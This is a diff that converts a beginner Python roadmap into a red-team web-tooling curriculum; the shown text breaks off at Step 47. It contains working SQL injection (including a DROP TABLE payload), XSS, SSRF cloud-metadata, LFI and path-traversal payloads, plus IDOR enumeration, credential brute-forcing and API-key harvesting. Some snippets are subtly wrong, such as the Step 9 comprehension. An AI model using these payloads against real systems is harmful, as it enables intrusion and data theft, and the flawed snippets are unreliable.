@@ -1,442 +1,1081 @@
-# Python Fundamentals Roadmap — 40 Steps to Master the Basics
-
-> **Goal:** Strengthen your Python foundation step by step — variables, loops, comprehensions, collections, OOP, and more. No advanced modules, just solid fundamentals.
-
----
-
-## 🟢 Stage 1: Language Basics (Steps 1–10)
+## 🟢 Stage 1 — Language Basics
+> Mandatory. No web tool can be written without syntax fundamentals.
 
 ### Step 1 — Hello World & Program Structure
-Understand the entry point of a Python script. Learn how Python executes top-to-bottom. Run your first script.
+Script entry point, `print()`, shebang line, `if __name__ == "__main__"`.
 ```python
-print("Hello, World!")
+#!/usr/bin/env python3
+print("Hello, Red Team!")
+
+if __name__ == "__main__":
+    main()
 ```
 
 ### Step 2 — Variables & Data Types
-Learn the core types: `int`, `float`, `complex`, `bool`, `str`, `NoneType`. Understand dynamic typing — no need to declare types explicitly.
+`int`, `float`, `bool`, `str`, `bytes`, `None`. Dynamic typing.
 ```python
-age = 25
-name = "Anar"
-is_active = True
-nothing = None
+port = 80
+host = "10.0.0.1"
+is_open = True
+payload = b"\x41\x41\x41"
 ```
 
 ### Step 3 — Type Conversion
-Understand explicit casting with `int()`, `float()`, `str()`, `bool()`. Use `type()` to inspect types at runtime.
+`int()`, `str()`, `bytes()`, `ord()`, `chr()`. Essential when parsing HTTP responses and raw sockets.
 ```python
-text = "42"
-number = int(text)
-pi_str = str(3.14)
+raw = "8080"
+port = int(raw)
+encoded = str(port).encode()         # → b'8080'
+char_val = ord("A")                   # → 65
 ```
 
 ### Step 4 — Operators
-Arithmetic (`+`, `-`, `*`, `/`, `//`, `%`, `**`), comparison (`==`, `!=`, `>`, `<`), logical (`and`, `or`, `not`), and assignment operators (`+=`, `-=`, `*=`).
+Arithmetic (`+`, `-`, `*`, `/`, `%`, `//`), comparison (`==`, `!=`, `>`, `<`), logical (`and`, `or`, `not`), bitwise (`&`, `|`, `^`, `~`, `<<`, `>>`).
 ```python
-result = 2 ** 8      # 256
-quotient = 17 // 3   # 5 (floor division)
+xored = 0x41 ^ 0xFF                  # bitwise XOR — used in payload encoding
+flag = is_auth and is_admin
 ```
 
 ### Step 5 — String Operations
-Learn `len()`, `.upper()`, `.lower()`, `.strip()`, `.replace()`, `.split()`, `.join()`, slicing (`s[1:5]`), and f-strings.
+`f-strings`, `.split()`, `.strip()`, `.replace()`, `.startswith()`, `.encode()`, `.decode()`.
 ```python
-full = f"Hello, {name}! You are {age} years old."
-words = "hello world".split()   # ['hello', 'world']
+url = f"http://{host}:{port}/login"
+parts = "user:password".split(":")
+header = "  Bearer token123  ".strip()
+raw_bytes = url.encode("utf-8")
 ```
 
-### Step 6 — Conditional Statements (if / elif / else)
-Control the flow of your program using `if`, `elif`, and `else`. Python uses indentation — no braces.
+### Step 6 — Conditional Statements
+`if`, `elif`, `else`, one-liners.
 ```python
-if age >= 18:
-    print("Adult")
-elif age >= 13:
-    print("Teen")
+if status_code == 200:
+    print("[+] Login successful")
+elif status_code == 403:
+    print("[-] Forbidden")
 else:
-    print("Child")
+    print("[?] Unexpected response")
 ```
 
-### Step 7 — Ternary Expression & Short-Circuit Evaluation
-Use Python's one-line conditional expression. Understand how `and`/`or` short-circuit for safe defaults.
+### Step 7 — Ternary & Short-Circuit
+Compact conditionals — common in payload generation logic.
 ```python
-label = "Adult" if age >= 18 else "Minor"
-display = name or "Anonymous"
+method = "POST" if has_body else "GET"
+target = user_input or "127.0.0.1"
 ```
 
 ### Step 8 — Loops: for & while
-Master `for` loops with `range()`. Use `while` for condition-based loops. Control flow with `break` and `continue`.
+Iteration over port ranges, wordlists, URL paths.
 ```python
-for i in range(10):
-    print(i)
+for port in range(1, 1025):
+    scan(host, port)
 
-count = 0
-while count < 5:
-    count += 1
+while not connected:
+    attempt_connect()
 ```
 
-### Step 9 — Loops: Nested Loops & else Clause
-Use nested loops for 2D iteration. Learn the unusual `else` block on loops — runs when no `break` occurred.
+### Step 9 — Loop Control & Comprehensions
+`break`, `continue`, list/dict/set comprehensions — concise data processing.
 ```python
-for i in range(3):
-    for j in range(3):
-        print(i, j)
+open_ports = [p for p in range(1, 1025) if is_open(host, p)]
+headers = {k: v for k, v in raw.split(": ") for raw in header_lines}
 ```
 
 ### Step 10 — Functions
-Define and call functions with `def`. Understand parameters, return values, default arguments, and `*args` / `**kwargs`.
+Parameters, return values, `*args`, `**kwargs`, default values.
 ```python
-def add(a, b=0):
-    return a + b
+def scan_port(host: str, port: int, timeout: float = 1.0) -> bool:
+    ...
 
-def greet(*names):
-    for name in names:
-        print(f"Hello, {name}!")
+def send_request(url, **kwargs):
+    ...
 ```
 
 ---
 
-## 🔵 Stage 2: Collections & Data Structures (Steps 11–20)
+## 🔵 Stage 2 — Data Structures
+> Every web tool stores and processes targets, payloads, cookies, headers, and results.
 
 ### Step 11 — Lists
-Create and use lists — Python's dynamic array. Index, slice, and mutate them. Core methods: `append()`, `remove()`, `pop()`, `sort()`, `len()`.
+Ordered, mutable. Wordlists, URL queues, discovered endpoints.
 ```python
-numbers = [1, 2, 3, 4, 5]
-numbers.append(6)
-numbers.sort(reverse=True)
+wordlist = ["admin", "login", "dashboard", "config"]
+found_paths = []
+found_paths.append("/admin/panel")
+found_paths.sort()
 ```
 
-### Step 12 — List Slicing & Copying
-Use slicing `[start:stop:step]` to extract sublists. Understand shallow vs deep copying with `copy()` and `copy.deepcopy()`.
+### Step 12 — Dictionaries
+Key-value store. HTTP headers, cookies, POST bodies, JSON payloads.
 ```python
-evens = numbers[::2]
-reversed_list = numbers[::-1]
+headers = {
+    "User-Agent": "Mozilla/5.0",
+    "Authorization": "Bearer eyJ...",
+    "Content-Type": "application/json"
+}
+cookies = {"session": "abc123", "role": "user"}
 ```
 
-### Step 13 — Tuples
-Immutable ordered sequences. Use for fixed data, multiple return values, and as dictionary keys. Unpack with ease.
+### Step 13 — Sets
+Unique elements. Deduplicating discovered subdomains, scanned URLs.
 ```python
-point = (3, 7)
-x, y = point
-
-def get_person():
-    return "Anar", 25
-
-name, age = get_person()
+discovered = set()
+discovered.add("api.target.com")
+discovered.add("api.target.com")   # ignored — already exists
+unique_hosts = list(discovered)
 ```
 
-### Step 14 — Dictionaries
-Store key-value pairs. Use `get()`, `keys()`, `values()`, `items()`, `update()`, `pop()`. Iterate safely with `.items()`.
+### Step 14 — Tuples
+Immutable pairs. Host-port combinations, credential pairs.
 ```python
-ages = {"Ali": 30, "Veli": 25}
-ages["Anar"] = 28
-print(ages.get("Unknown", 0))   # 0 (default)
+targets = [("10.0.0.1", 80), ("10.0.0.2", 443)]
+for host, port in targets:
+    probe(host, port)
 ```
 
-### Step 15 — Sets
-Unique element collections. Perform set operations: `union()`, `intersection()`, `difference()`, `issubset()`.
+### Step 15 — collections Module
+`deque` for efficient queuing, `defaultdict` for grouped results, `Counter` for frequency analysis.
 ```python
-a = {1, 2, 3}
-b = {2, 3, 4}
-print(a & b)   # {2, 3} — intersection
-print(a | b)   # {1, 2, 3, 4} — union
-```
+from collections import deque, defaultdict, Counter
 
-### Step 16 — Stack & Queue Patterns
-Implement LIFO stacks using a `list` (`append`/`pop`). Use `collections.deque` for efficient FIFO queues (`appendleft`/`pop`).
-```python
-from collections import deque
-queue = deque()
-queue.append("first")
-queue.appendleft("zero")
-```
-
-### Step 17 — List Comprehensions
-Create new lists in one concise line. Filter and transform simultaneously. More Pythonic than manual `for` loops.
-```python
-squares = [x ** 2 for x in range(10)]
-evens = [x for x in range(20) if x % 2 == 0]
-```
-
-### Step 18 — Dict & Set Comprehensions
-Apply the same comprehension syntax to dictionaries and sets for compact, readable data transformations.
-```python
-word_lengths = {word: len(word) for word in ["apple", "banana"]}
-unique_squares = {x ** 2 for x in range(-3, 4)}
-```
-
-### Step 19 — Sorting & Searching Collections
-Use `sorted()` and `list.sort()` with `key=` and `reverse=`. Search with `in`, `index()`, and `bisect` for sorted lists.
-```python
-people = [("Ali", 30), ("Veli", 25)]
-people.sort(key=lambda p: p[1])   # sort by age
-```
-
-### Step 20 — `collections` Module
-Master `Counter`, `defaultdict`, `OrderedDict`, `namedtuple`, and `deque` — built-in power tools for real-world data handling.
-```python
-from collections import Counter, defaultdict
-counts = Counter("mississippi")
-dd = defaultdict(list)
-dd["key"].append(1)   # no KeyError
+crawl_queue = deque(["https://target.com"])
+results = defaultdict(list)           # results["sqli"] = [url1, url2]
+status_freq = Counter(status_codes)   # most common status codes
 ```
 
 ---
 
-## 🟣 Stage 3: Object-Oriented Programming (Steps 21–28)
+## 🟣 Stage 3 — Object-Oriented Programming
+> Structuring tools professionally — Scanner, Fuzzer, Session, Exploit classes.
 
-### Step 21 — Classes & Objects
-Define a class with `class`. Create objects with `ClassName()`. Understand `self` — the reference to the current instance.
+### Step 16 — Classes & Objects
+Encapsulating tool logic — Scanner, Fuzzer, CrawlSession classes.
 ```python
-class Car:
-    def __init__(self, brand):
-        self.brand = brand
-
-my_car = Car("Toyota")
+class WebScanner:
+    def __init__(self, base_url: str):
+        self.base_url = base_url
+        self.found_paths: list[str] = []
+        self.session = requests.Session()
 ```
 
-### Step 22 — Instance vs Class vs Static Methods
-Understand `self` (instance method), `cls` (class method with `@classmethod`), and `@staticmethod` for utility functions.
+### Step 17 — Properties & Access Modifiers
+Python convention: `_private`, `__mangled`. Properties via `@property`.
 ```python
-class Counter:
-    count = 0
-
-    @classmethod
-    def increment(cls):
-        cls.count += 1
-```
-
-### Step 23 — Properties & Encapsulation
-Use `@property`, `@setter`, and `@deleter` for controlled attribute access. Prefix private attributes with `_` or `__`.
-```python
-class Person:
-    def __init__(self, age):
-        self._age = age
+class Config:
+    def __init__(self):
+        self._proxy = None
 
     @property
-    def age(self):
-        return self._age
+    def proxy(self):
+        return self._proxy
 
-    @age.setter
-    def age(self, value):
-        if value < 0:
-            raise ValueError("Age cannot be negative")
-        self._age = value
+    @proxy.setter
+    def proxy(self, value):
+        self._proxy = {"http": value, "https": value}
 ```
 
-### Step 24 — Inheritance
-Extend a base class using `class Child(Parent)`. Use `super()` to call parent methods. Override methods in the child class.
+### Step 18 — Constructors & `__repr__`
+Tool initialization. `__repr__` for clean debug output.
 ```python
-class Animal:
-    def speak(self):
-        return "..."
+class Target:
+    def __init__(self, url: str, cookies: dict = None):
+        self.url = url
+        self.cookies = cookies or {}
 
-class Dog(Animal):
-    def speak(self):
-        return "Woof!"
+    def __repr__(self):
+        return f"<Target url={self.url}>"
 ```
 
-### Step 25 — Polymorphism & Duck Typing
-Python's polymorphism comes from duck typing — if it walks like a duck and quacks like a duck, it is a duck. No explicit interface needed.
+### Step 19 — Inheritance
+Base exploit class with specialized subclasses — SQLi, XSS, SSRF inheriting from `BaseExploit`.
 ```python
-def make_sound(animal):
-    print(animal.speak())   # works for any object with speak()
+class BaseExploit:
+    def __init__(self, target: str):
+        self.target = target
+
+    def run(self) -> str:
+        raise NotImplementedError
+
+class SQLiExploit(BaseExploit):
+    def run(self) -> str:
+        return self._inject("' OR 1=1--")
+
+class SSRFExploit(BaseExploit):
+    def run(self) -> str:
+        return self._probe("http://169.254.169.254/")
 ```
 
-### Step 26 — Abstract Classes & Interfaces
-Use `abc.ABC` and `@abstractmethod` to enforce method implementation in subclasses. Python's equivalent of interfaces.
+### Step 20 — Abstract Classes & Interfaces
+Enforcing contracts across different scanner implementations.
 ```python
 from abc import ABC, abstractmethod
 
-class Shape(ABC):
+class BaseScanner(ABC):
     @abstractmethod
-    def area(self) -> float:
+    def scan(self, url: str) -> list[str]: ...
+
+    @abstractmethod
+    def report(self) -> dict: ...
+
+class DirectoryFuzzer(BaseScanner):
+    def scan(self, url): ...
+    def report(self): ...
+```
+
+### Step 21 — Static & Class Methods
+Utility helpers — payload generators, URL parsers, encoder utilities.
+```python
+class PayloadUtils:
+    @staticmethod
+    def url_encode(payload: str) -> str:
+        from urllib.parse import quote
+        return quote(payload, safe="")
+
+    @classmethod
+    def from_file(cls, path: str) -> list[str]:
+        with open(path) as f:
+            return [line.strip() for line in f]
+```
+
+---
+
+## 🟡 Stage 4 — Functional Python & Comprehensions
+> Filter, transform, and query data — essential for processing HTTP responses and recon output.
+
+### Step 22 — map, filter, zip
+Transforming and filtering collections without loops.
+```python
+urls = list(map(lambda p: f"https://target.com/{p}", wordlist))
+valid = list(filter(lambda u: u.status_code == 200, responses))
+pairs = list(zip(usernames, passwords))
+```
+
+### Step 23 — sorted, groupby, itertools
+Sorting results, grouping by status code, generating payload combinations.
+```python
+from itertools import product, chain
+import itertools
+
+sorted_urls = sorted(found, key=lambda x: x["status"])
+combos = list(product(users, passwords))          # brute-force pairs
+all_payloads = list(chain(xss_list, sqli_list))   # merge payload lists
+```
+
+### Step 24 — any, all, next, enumerate
+Quick checks on scan results.
+```python
+has_sqli = any("error in your SQL" in r.text for r in responses)
+all_up   = all(r.status_code < 500 for r in probes)
+first_hit = next((r for r in results if r.status_code == 200), None)
+
+for i, url in enumerate(targets, start=1):
+    print(f"[{i}/{len(targets)}] Testing {url}")
+```
+
+---
+
+## 🔴 Stage 5 — Essentials
+> Every web tool in production relies on these.
+
+### Step 25 — Exception Handling
+Mandatory for network tooling — connection errors, timeouts, SSL failures.
+```python
+import requests
+
+try:
+    resp = requests.get(url, timeout=5)
+    resp.raise_for_status()
+except requests.exceptions.ConnectionError:
+    print(f"[-] {url} — connection refused")
+except requests.exceptions.Timeout:
+    print(f"[-] {url} — timed out")
+except requests.exceptions.HTTPError as e:
+    print(f"[!] HTTP error: {e}")
+finally:
+    pass  # cleanup if needed
+```
+
+### Step 26 — Context Managers & `with`
+File I/O and session management — automatic resource cleanup.
+```python
+# File operations
+with open("wordlist.txt") as f:
+    words = f.read().splitlines()
+
+# Requests sessions
+with requests.Session() as s:
+    s.headers.update({"Authorization": "Bearer token"})
+    resp = s.get(url)
+```
+
+### Step 27 — Decorators
+Retry logic, timing, rate-limiting wrappers — wrapping scanner functions cleanly.
+```python
+import time, functools
+
+def retry(times=3, delay=1):
+    def decorator(fn):
+        @functools.wraps(fn)
+        def wrapper(*args, **kwargs):
+            for attempt in range(times):
+                try:
+                    return fn(*args, **kwargs)
+                except Exception as e:
+                    if attempt == times - 1:
+                        raise
+                    time.sleep(delay)
+        return wrapper
+    return decorator
+
+@retry(times=3, delay=0.5)
+def fetch(url):
+    return requests.get(url, timeout=5)
+```
+
+### Step 28 — Generators & Iterators
+Memory-efficient wordlist streaming — loading millions of passwords without RAM explosion.
+```python
+def read_wordlist(path: str):
+    with open(path) as f:
+        for line in f:
+            yield line.strip()
+
+def url_generator(base: str, wordlist_path: str):
+    for word in read_wordlist(wordlist_path):
+        yield f"{base}/{word}"
+
+# Process without loading entire file into memory
+for url in url_generator("https://target.com", "big_wordlist.txt"):
+    probe(url)
+```
+
+### Step 29 — Encoding & Bytes
+Payload encoding, Base64, URL encoding, hashing — foundation of web exploitation.
+```python
+import base64, hashlib
+from urllib.parse import quote, unquote
+
+# Base64
+b64 = base64.b64encode(b"whoami").decode()
+raw = base64.b64decode(b64)
+
+# URL encoding
+encoded = quote("' OR 1=1--", safe="")    # → %27+OR+1%3D1--
+
+# XOR
+key = 0x41
+xored = bytes([b ^ key for b in b"payload"])
+
+# Hashing
+md5 = hashlib.md5(b"password").hexdigest()
+sha256 = hashlib.sha256(b"data").hexdigest()
+```
+
+### Step 30 — File I/O
+Reading wordlists, writing loot, loading config — required by every tool.
+```python
+# Read targets / wordlists
+targets = open("targets.txt").read().splitlines()
+passwords = [l.strip() for l in open("rockyou.txt", encoding="latin-1")]
+
+# Write results
+with open("results.txt", "a") as f:
+    f.write(f"[+] SQLi found: {url}\n")
+
+# JSON config
+import json
+config = json.load(open("config.json"))
+json.dump(results, open("output.json", "w"), indent=2)
+```
+
+### Step 31 — Async / Await
+The most critical topic for web tools. Synchronous scan = slow. Async scan = fast.
+```python
+import asyncio
+import aiohttp
+
+async def probe(session: aiohttp.ClientSession, url: str):
+    try:
+        async with session.get(url, timeout=aiohttp.ClientTimeout(total=3)) as resp:
+            if resp.status == 200:
+                print(f"[+] {url} — {resp.status}")
+    except Exception:
         pass
 
-class Circle(Shape):
-    def __init__(self, r): self.r = r
-    def area(self): return 3.14 * self.r ** 2
-```
+async def fuzz(base_url: str, wordlist: list[str]):
+    async with aiohttp.ClientSession() as session:
+        tasks = [probe(session, f"{base_url}/{word}") for word in wordlist]
+        await asyncio.gather(*tasks)
 
-### Step 27 — Magic / Dunder Methods
-Customize class behavior with `__str__`, `__repr__`, `__len__`, `__eq__`, `__lt__`, `__add__`, and more.
-```python
-class Vector:
-    def __init__(self, x, y):
-        self.x, self.y = x, y
-
-    def __add__(self, other):
-        return Vector(self.x + other.x, self.y + other.y)
-
-    def __repr__(self):
-        return f"Vector({self.x}, {self.y})"
-```
-
-### Step 28 — Dataclasses & NamedTuples
-Use `@dataclass` for clean, auto-generated `__init__`, `__repr__`, and `__eq__`. Use `NamedTuple` for lightweight immutable records.
-```python
-from dataclasses import dataclass
-
-@dataclass
-class Person:
-    name: str
-    age: int
+asyncio.run(fuzz("https://target.com", wordlist))
 ```
 
 ---
 
-## 🟡 Stage 4: Functional Tools & Comprehensions (Steps 29–34)
+## ⚫ Stage 6 — HTTP Internals
+> This is where web Red Team tooling actually begins.
 
-### Step 29 — Lambda Functions
-Write short anonymous functions with `lambda`. Use for simple one-liners passed as arguments.
+### Step 32 — requests Library Deep Dive
+Full control over HTTP — headers, cookies, proxies, redirects, SSL bypass.
 ```python
-square = lambda x: x ** 2
-numbers.sort(key=lambda x: -x)
+import requests
+
+session = requests.Session()
+session.verify = False                        # bypass SSL verification
+session.proxies = {"http": "http://127.0.0.1:8080"}  # route through Burp
+
+resp = session.post(
+    "https://target.com/login",
+    data={"username": "admin", "password": "pass"},
+    headers={"X-Forwarded-For": "127.0.0.1"},
+    allow_redirects=False,
+    timeout=10
+)
+print(resp.status_code, resp.headers, resp.cookies)
 ```
 
-### Step 30 — `map()`, `filter()`, `reduce()`
-Apply functions to collections. `map()` transforms, `filter()` selects, `reduce()` (from `functools`) folds.
+### Step 33 — Raw HTTP with socket
+Crafting malformed or non-standard HTTP requests that `requests` cannot send.
 ```python
-from functools import reduce
-doubled = list(map(lambda x: x * 2, [1, 2, 3]))
-evens = list(filter(lambda x: x % 2 == 0, range(10)))
-total = reduce(lambda a, b: a + b, [1, 2, 3, 4])
+import socket
+
+raw_request = (
+    b"GET /../../../../etc/passwd HTTP/1.1\r\n"
+    b"Host: target.com\r\n"
+    b"Connection: close\r\n\r\n"
+)
+
+s = socket.socket()
+s.connect(("target.com", 80))
+s.send(raw_request)
+response = b""
+while chunk := s.recv(4096):
+    response += chunk
+s.close()
+print(response.decode(errors="ignore"))
 ```
 
-### Step 31 — Generators & `yield`
-Use `yield` to create lazy iterators that produce values one at a time — memory-efficient for large sequences.
+### Step 34 — HTTP Response Parsing
+Extracting tokens, forms, links, and secrets from HTML responses.
 ```python
-def countdown(n):
-    while n > 0:
-        yield n
-        n -= 1
+from bs4 import BeautifulSoup
+import re
 
-for num in countdown(5):
-    print(num)
+soup = BeautifulSoup(resp.text, "html.parser")
+
+# Extract all links
+links = [a["href"] for a in soup.find_all("a", href=True)]
+
+# Extract hidden form fields (CSRF tokens)
+csrf = soup.find("input", {"name": "_token"})["value"]
+
+# Extract emails, API keys from JS
+emails = re.findall(r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-z]{2,}", resp.text)
+api_keys = re.findall(r"['\"]([A-Za-z0-9_\-]{32,45})['\"]", resp.text)
 ```
 
-### Step 32 — Generator Expressions
-Like list comprehensions, but lazy — values are generated on demand, not stored in memory all at once.
+### Step 35 — Authentication Mechanisms
+Interacting with Basic Auth, Bearer tokens, JWTs, session cookies.
 ```python
-total = sum(x ** 2 for x in range(1000000))   # no list created
+import base64
+
+# Basic Auth header
+creds = base64.b64encode(b"admin:password").decode()
+headers = {"Authorization": f"Basic {creds}"}
+
+# Bearer token
+headers = {"Authorization": f"Bearer {jwt_token}"}
+
+# JWT decode (no verification — for inspection)
+import json
+parts = jwt_token.split(".")
+payload = json.loads(base64.b64decode(parts[1] + "=="))
+print(payload)   # {"sub": "user", "role": "admin", "exp": 1234567890}
 ```
 
-### Step 33 — `enumerate()`, `zip()`, `any()`, `all()`
-Essential built-ins for Pythonic loops and aggregation checks.
+### Step 36 — URL & Query String Manipulation
+Building and mutating URLs for fuzzing, IDOR testing, path traversal.
 ```python
-for i, val in enumerate(["a", "b", "c"]):
-    print(i, val)
+from urllib.parse import urlparse, urlencode, parse_qs, urljoin
 
-pairs = list(zip([1, 2, 3], ["a", "b", "c"]))
-print(all(x > 0 for x in [1, 2, 3]))   # True
-```
+parsed = urlparse("https://target.com/profile?id=5&page=1")
+params = parse_qs(parsed.query)      # {'id': ['5'], 'page': ['1']}
+params["id"] = ["1 OR 1=1"]
+new_qs = urlencode(params, doseq=True)
+mutated = parsed._replace(query=new_qs).geturl()
 
-### Step 34 — Decorators
-Functions that wrap other functions to add behavior (logging, timing, authentication). Understand `@functools.wraps`.
-```python
-import functools
-
-def logger(func):
-    @functools.wraps(func)
-    def wrapper(*args, **kwargs):
-        print(f"Calling {func.__name__}")
-        return func(*args, **kwargs)
-    return wrapper
-
-@logger
-def greet(name):
-    print(f"Hello, {name}!")
-```
-
----
-
-## 🔴 Stage 5: Error Handling & Other Essentials (Steps 35–40)
-
-### Step 35 — Exception Handling (try / except / finally)
-Wrap risky code in `try`. Catch specific exceptions with `except`. Use `finally` for cleanup, `else` when no error occurs.
-```python
-try:
-    result = int("abc")
-except ValueError as e:
-    print(f"Error: {e}")
-finally:
-    print("Done")
-```
-
-### Step 36 — Custom Exceptions
-Create your own exception classes by inheriting from `Exception`. Add custom attributes and messages.
-```python
-class AgeError(Exception):
-    def __init__(self, age):
-        super().__init__(f"Invalid age: {age}")
-        self.age = age
-
-raise AgeError(-5)
-```
-
-### Step 37 — `with` Statement & Context Managers
-Use `with` for automatic resource management (files, locks, DB connections). Create your own with `__enter__`/`__exit__` or `contextlib`.
-```python
-with open("data.txt", "r") as f:
-    content = f.read()   # file closes automatically
-```
-
-### Step 38 — File I/O
-Read and write text and binary files. Use `open()` with modes `r`, `w`, `a`, `rb`. Work with `pathlib.Path` for modern file handling.
-```python
-from pathlib import Path
-
-path = Path("output.txt")
-path.write_text("Hello, file!")
-content = path.read_text()
-```
-
-### Step 39 — Modules & Packages
-Organize code into modules (`.py` files) and packages (directories with `__init__.py`). Understand `import`, `from ... import`, and `__name__ == "__main__"`.
-```python
-# mymodule.py
-def greet(name):
-    return f"Hello, {name}!"
-
-# main.py
-from mymodule import greet
-print(greet("Anar"))
-```
-
-### Step 40 — Type Hints & `match` Statement
-Add type hints for readability and IDE support (not enforced at runtime). Use Python 3.10+ `match` for structural pattern matching.
-```python
-def add(a: int, b: int) -> int:
-    return a + b
-
-match command:
-    case "quit":
-        print("Exiting...")
-    case "help":
-        print("Commands: quit, help")
-    case _:
-        print("Unknown command")
+# Path traversal
+for depth in range(1, 8):
+    path = "../" * depth + "etc/passwd"
+    url = urljoin("https://target.com/files/", path)
 ```
 
 ---
 
-## 📌 Recommended Practice Order
+## 🔥 Stage 7 — Web Exploitation Techniques
+> Core offensive web techniques implemented in Python.
 
-| Priority | Topic |
-|---|---|
-| 🔥 First | Steps 1–10 (Language Basics) |
-| 🔥 Second | Steps 11–15 (List, Dict, Set) |
-| 🔥 Third | Steps 21–26 (OOP) |
-| 🔥 Fourth | Steps 29–34 (Functional Tools) |
-| 🔥 Fifth | Steps 35–40 (Exceptions, Modules) |
+### Step 37 — Directory & Endpoint Fuzzing
+Async directory brute-forcing — finding hidden admin panels, APIs, config files.
+```python
+async def dir_fuzz(base_url: str, wordlist: list[str], extensions=("", ".php", ".bak")):
+    async with aiohttp.ClientSession() as session:
+        tasks = []
+        for word in wordlist:
+            for ext in extensions:
+                url = f"{base_url}/{word}{ext}"
+                tasks.append(probe(session, url))
+        await asyncio.gather(*tasks)
+```
+
+### Step 38 — Parameter Discovery & IDOR
+Finding hidden parameters and testing Insecure Direct Object References.
+```python
+# Parameter name fuzzing
+param_wordlist = ["id", "user_id", "uid", "pid", "file", "path", "doc"]
+for param in param_wordlist:
+    resp = session.get(url, params={param: "1"})
+    if resp.status_code != 404:
+        print(f"[+] Parameter found: {param}")
+
+# IDOR — iterate object IDs
+for obj_id in range(1, 1000):
+    resp = session.get(f"{base}/api/user/{obj_id}")
+    if resp.status_code == 200:
+        print(f"[+] IDOR hit: /api/user/{obj_id} → {resp.json()}")
+```
+
+### Step 39 — SQL Injection Detection & Exploitation
+Error-based, boolean-based, and time-based SQLi detection.
+```python
+error_payloads = ["'", '"', "' OR '1'='1", "' OR SLEEP(5)--", "1; DROP TABLE--"]
+
+# Error-based detection
+for payload in error_payloads:
+    resp = session.get(url, params={"id": payload})
+    if any(sig in resp.text for sig in ["SQL syntax", "mysql_fetch", "ORA-", "pg_query"]):
+        print(f"[+] SQL error detected with payload: {payload}")
+
+# Time-based blind
+import time
+start = time.time()
+session.get(url, params={"id": "1' AND SLEEP(5)--"})
+elapsed = time.time() - start
+if elapsed >= 5:
+    print("[+] Time-based SQLi confirmed")
+```
+
+### Step 40 — XSS Detection
+Reflected and stored XSS probe injection and response analysis.
+```python
+xss_probes = [
+    "<script>alert(1)</script>",
+    '"><img src=x onerror=alert(1)>',
+    "javascript:alert(1)",
+    "';alert(1)//",
+    "<svg onload=alert(1)>",
+]
+
+for probe in xss_probes:
+    resp = session.get(url, params={"q": probe})
+    if probe in resp.text:
+        print(f"[+] Reflected XSS: {probe}")
+    # For stored XSS — submit then visit output page and check
+```
+
+### Step 41 — SSRF Detection
+Probing internal services and metadata endpoints via Server-Side Request Forgery.
+```python
+ssrf_targets = [
+    "http://169.254.169.254/latest/meta-data/",       # AWS metadata
+    "http://metadata.google.internal/computeMetadata/",# GCP metadata
+    "http://127.0.0.1:22",                             # local SSH
+    "http://127.0.0.1:6379",                           # Redis
+    "http://0.0.0.0:8080",                             # internal app
+    "file:///etc/passwd",                              # local file
+]
+
+for target in ssrf_targets:
+    resp = session.post(url, json={"url": target}, timeout=5)
+    if resp.status_code == 200 and len(resp.content) > 0:
+        print(f"[+] Potential SSRF: {target}")
+        print(resp.text[:200])
+```
+
+### Step 42 — Path Traversal & LFI
+Reading local files through vulnerable file inclusion parameters.
+```python
+lfi_payloads = [
+    "../../../../etc/passwd",
+    "..%2F..%2F..%2Fetc%2Fpasswd",
+    "....//....//....//etc/passwd",
+    "/etc/passwd%00",               # null byte truncation (PHP < 5.4)
+    "php://filter/convert.base64-encode/resource=index.php",
+]
+
+signatures = ["root:x:0:0", "daemon:", "bin/bash"]
+
+for payload in lfi_payloads:
+    resp = session.get(url, params={"file": payload})
+    if any(sig in resp.text for sig in signatures):
+        print(f"[+] LFI confirmed: {payload}")
+        print(resp.text[:500])
+```
 
 ---
 
-## 📚 Recommended Resources
+## 🟠 Stage 8 — Automation & Tooling
+> Building complete, scriptable tools — not one-off scripts.
 
-- [Official Python Documentation](https://docs.python.org/3/)
-- [Python Tutorial – docs.python.org](https://docs.python.org/3/tutorial/)
-- [Real Python – realpython.com](https://realpython.com) — beginner to advanced guides
-- [LeetCode Easy problems](https://leetcode.com) — practice with Python
-- [Python Tutor](https://pythontutor.com) — visualize code execution in the browser
+### Step 43 — argparse: CLI Interface
+Every real tool needs a CLI — targets, wordlists, threads, output files.
+```python
+import argparse
+
+def parse_args():
+    parser = argparse.ArgumentParser(description="Web Fuzzer")
+    parser.add_argument("-u", "--url", required=True, help="Target URL")
+    parser.add_argument("-w", "--wordlist", required=True, help="Wordlist path")
+    parser.add_argument("-t", "--threads", type=int, default=50, help="Thread count")
+    parser.add_argument("-o", "--output", help="Output file")
+    parser.add_argument("-x", "--extensions", default=".php,.html", help="Extensions")
+    parser.add_argument("--proxy", help="Proxy (e.g. http://127.0.0.1:8080)")
+    parser.add_argument("--timeout", type=float, default=5.0)
+    return parser.parse_args()
+```
+
+### Step 44 — Logging & Output Formatting
+Structured output — color-coded results, log levels, file logging.
+```python
+import logging
+from colorama import Fore, Style, init
+
+init(autoreset=True)
+
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s %(levelname)s %(message)s",
+    handlers=[
+        logging.FileHandler("scan.log"),
+        logging.StreamHandler()
+    ]
+)
+
+def log_found(url, status, length):
+    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {url} [{status}] [{length}b]")
+
+def log_error(msg):
+    print(f"{Fore.RED}[-]{Style.RESET_ALL} {msg}")
+```
+
+### Step 45 — Threading vs Asyncio
+Choosing the right concurrency model for the task.
+```python
+# Threading — good for blocking I/O, simple tools
+from concurrent.futures import ThreadPoolExecutor
+
+with ThreadPoolExecutor(max_workers=50) as pool:
+    futures = [pool.submit(probe, url) for url in url_list]
+
+# Asyncio — best for high-concurrency network tools (1000s of requests)
+async def mass_scan(urls):
+    sem = asyncio.Semaphore(200)          # rate limit concurrency
+    async def bounded(url):
+        async with sem:
+            return await probe(url)
+    return await asyncio.gather(*[bounded(u) for u in urls])
+```
+
+### Step 46 — Output: JSON, CSV, HTML Reports
+Structured results for integration with other tools and reporting.
+```python
+import json, csv
+
+results = [{"url": u, "status": s, "length": l} for u, s, l in hits]
+
+# JSON output
+json.dump(results, open("results.json", "w"), indent=2)
+
+# CSV output
+with open("results.csv", "w", newline="") as f:
+    w = csv.DictWriter(f, fieldnames=["url", "status", "length"])
+    w.writeheader()
+    w.writerows(results)
+```
 
 ---
 
-*Good luck! 🚀 Master the fundamentals and everything else becomes much easier.*
+## 🔴 Stage 9 — Advanced Reconnaissance
+> Automated information gathering — subdomains, JS secrets, API mapping.
+
+### Step 47 — Subdomain Enumeration
+DNS-based and HTTP-based subdomain discovery.
+```python
